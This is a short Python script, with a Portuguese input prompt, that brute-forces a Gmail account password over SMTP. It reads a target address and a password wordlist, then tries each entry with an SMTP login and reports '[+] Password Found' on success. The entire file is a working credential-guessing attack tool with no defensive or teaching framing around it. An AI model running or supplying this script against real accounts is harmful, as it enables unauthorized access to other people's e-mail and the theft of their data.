import smtplib

from pip._vendor.distlib.compat import raw_input

smtpserver= smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
user = raw_input("Qual o e-mail:");
passwfile = raw_input("Password file name");
passwfile = open(passwfile,"r");

for password in passwfile:
    try:
        smtpserver.login(user, password);
        print ("[+] Password Found: {}".format(password))
        break;
    except smtplib.SMTPAuthenticationError:
        print ("[!] Password Incorrect: %s" %password)



